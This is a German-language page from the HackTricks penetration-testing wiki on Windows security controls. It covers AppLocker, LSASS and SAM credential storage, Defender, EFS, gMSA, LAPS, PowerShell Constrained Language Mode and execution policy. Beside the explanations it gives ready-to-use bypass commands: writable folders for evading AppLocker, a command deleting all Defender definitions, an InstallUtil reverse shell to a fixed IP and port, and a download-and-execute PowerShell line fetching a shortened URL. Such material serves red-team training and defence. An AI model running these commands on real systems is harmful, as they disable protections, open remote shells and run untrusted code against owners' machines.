# Windows-Sicherheitskontrollen

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein und ausgeführt werden dürfen. Das Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht mit den spezifischen Geschäftsbedürfnissen einer Organisation übereinstimmt.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Lösung zur Anwendungs-Whitelist** und gibt Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Es bietet **feingranulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, verpackte Apps und Installationsprogramme für verpackte Apps.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe** sowie Schreibzugriff auf bestimmte Verzeichnisse blockieren, **aber das kann alles umgangen werden**.

### Überprüfen

Überprüfen Sie, welche Dateien/Erweiterungen auf der schwarzen/weißen Liste stehen:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registrierungs-Pfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, die aktuellen Regeln zu überprüfen, die auf dem System durchgesetzt werden:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Umgehung

* Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker die Ausführung von allem innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die Sie verwenden können, um **dies zu umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Häufig **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binärdateien können ebenfalls nützlich sein, um AppLocker zu umgehen.
* **Schlecht geschriebene Regeln könnten ebenfalls umgangen werden**
* Zum Beispiel, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, können Sie einen **Ordner namens `allowed`** überall erstellen und er wird erlaubt.
* Organisationen konzentrieren sich oft darauf, die **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** ausführbare Datei zu **blockieren**, vergessen jedoch die **anderen** [**PowerShell ausführbaren Standorte**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
* **DLL-Durchsetzung sehr selten aktiviert** aufgrund der zusätzlichen Belastung, die sie auf ein System ausüben kann, und der Menge an Tests, die erforderlich sind, um sicherzustellen, dass nichts kaputt geht. Das Verwenden von **DLLs als Hintertüren wird helfen, AppLocker zu umgehen**.
* Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Für weitere Informationen siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Lokale Anmeldeinformationen sind in dieser Datei vorhanden, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Anmeldeinformationen** (gehasht) werden im **Speicher** dieses Subsystems aus Gründen der Single Sign-On gespeichert.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen...), **Authentifizierung**, **Zugriffstoken**...\
LSA wird diejenige sein, die die bereitgestellten Anmeldeinformationen in der **SAM**-Datei (für eine lokale Anmeldung) **überprüft** und mit dem **Domänencontroller** spricht, um einen Domänenbenutzer zu authentifizieren.

Die **Anmeldeinformationen** werden im **Prozess LSASS** gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA secrets

LSA könnte einige Anmeldeinformationen auf der Festplatte speichern:

* Passwort des Computerkontos des Active Directory (unerreichbarer Domänencontroller).
* Passwörter der Konten von Windows-Diensten
* Passwörter für geplante Aufgaben
* Mehr (Passwort von IIS-Anwendungen...)

### NTDS.dit

Es ist die Datenbank des Active Directory. Sie ist nur auf Domänencontrollern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige Pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese **Schutzmaßnahmen zu umgehen**.

### Check

Um den **Status** von **Defender** zu überprüfen, können Sie das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfen Sie den Wert von **`RealTimeProtectionEnabled`**, um zu wissen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es aufzulisten, könnten Sie auch ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS sichert Dateien durch Verschlüsselung, indem es einen **symmetrischen Schlüssel** verwendet, der als **Dateiverschlüsselungsschlüssel (FEK)** bekannt ist. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im $EFS **alternativen Datenstrom** der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Strom zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:

* Wenn Dateien oder Ordner in ein nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table) verschoben werden, werden sie automatisch entschlüsselt.
* Verschlüsselte Dateien, die über das Netzwerk über das SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht **transparenten Zugriff** auf verschlüsselte Dateien für den Eigentümer. Das bloße Ändern des Passworts des Eigentümers und das Anmelden ermöglichen jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

* EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt ist.
* Die Entschlüsselung verwendet den privaten Schlüssel des Benutzers, um auf den FEK zuzugreifen.
* Automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, wie z.B. beim Kopieren nach FAT32 oder bei der Netzwerkübertragung.
* Verschlüsselte Dateien sind für den Eigentümer ohne zusätzliche Schritte zugänglich.

### Überprüfen Sie EFS-Informationen

Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** genutzt hat, indem Sie überprüfen, ob dieser Pfad existiert: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Überprüfen Sie, **wer** Zugriff auf die Datei hat, indem Sie cipher /c \<file>\ verwenden.\
Sie können auch `cipher /e` und `cipher /d` in einem Ordner verwenden, um alle Dateien zu **verschlüsseln** und **zu entschlüsseln**.

### Entschlüsseln von EFS-Dateien

#### Als Autoritätssystem

Dieser Weg erfordert, dass der **Opferbenutzer** einen **Prozess** im Host **ausführt**. Wenn dies der Fall ist, können Sie mit einer `meterpreter`-Sitzung das Token des Prozesses des Benutzers nachahmen (`impersonate_token` von `incognito`). Oder Sie könnten einfach in den Prozess des Benutzers `migraten`.

#### Kenntnis des Benutzerpassworts

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu traditionellen Dienstkonten, die oft die Einstellung "**Passwort läuft niemals ab**" aktiviert haben, bieten gMSAs eine sicherere und verwaltbare Lösung:

* **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes, 240-Zeichen-Passwort, das automatisch gemäß der Domänen- oder Computerpolitik geändert wird. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
* **Erhöhte Sicherheit**: Diese Konten sind immun gegen Sperrungen und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
* **Unterstützung mehrerer Hosts**: gMSAs können über mehrere Hosts hinweg geteilt werden, was sie ideal für Dienste macht, die auf mehreren Servern ausgeführt werden.
* **Fähigkeit zu geplanten Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs das Ausführen geplanter Aufgaben.
* **Vereinfachte SPN-Verwaltung**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn es Änderungen an den sAMaccount-Details oder dem DNS-Namen des Computers gibt, was die SPN-Verwaltung vereinfacht.

Die Passwörter für gMSAs werden im LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und alle 30 Tage automatisch von Domänencontrollern (DCs) zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob, der als [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) bekannt ist, kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, um eine sichere Umgebung zu gewährleisten. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert werden.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Sie können dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen finden Sie in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)

Überprüfen Sie auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) darüber, wie man einen **NTLM-Relay-Angriff** durchführt, um das **Passwort** von **gMSA** zu **lesen**.

## LAPS

Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) heruntergeladen werden kann, ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig**, einzigartig und **regelmäßig geändert** sind, werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird die Möglichkeit geboten, lokale Admin-Passwörter zu lesen.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die benötigt werden, um PowerShell effektiv zu nutzen, wie das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierter Workflows, PowerShell-Klassen und mehr.

### **Überprüfen**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Umgehen
```powershell
#Easy bypass
Powershell -version 2
```
In aktuellen Windows funktioniert dieser Bypass nicht, aber Sie können [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Um es zu kompilieren, müssen Sie** **eine Referenz** _**hinzufügen**_ -> _Durchsuchen_ -> _Durchsuchen_ -> fügen Sie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzu und **ändern Sie das Projekt auf .Net4.5**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und den eingeschränkten Modus zu umgehen. Für weitere Informationen siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** eingestellt. Hauptwege, um diese Richtlinie zu umgehen:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür verantwortlich, das geeignete Protokoll für zwei Maschinen zu finden, die kommunizieren möchten. Die bevorzugte Methode dafür ist Kerberos. Dann wird die SSPI aushandeln, welches Authentifizierungsprotokoll verwendet wird, diese Authentifizierungsprotokolle werden als Security Support Provider (SSP) bezeichnet, befinden sich in jeder Windows-Maschine in Form einer DLL und beide Maschinen müssen dasselbe unterstützen, um kommunizieren zu können.

### Haupt-SSPs

* **Kerberos**: Der bevorzugte
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL und TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Es wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
* %windir%\Windows\System32\lsasrv.dll

#### Die Verhandlung könnte mehrere Methoden oder nur eine anbieten.

## UAC - Benutzerkontensteuerung

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterstützen</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
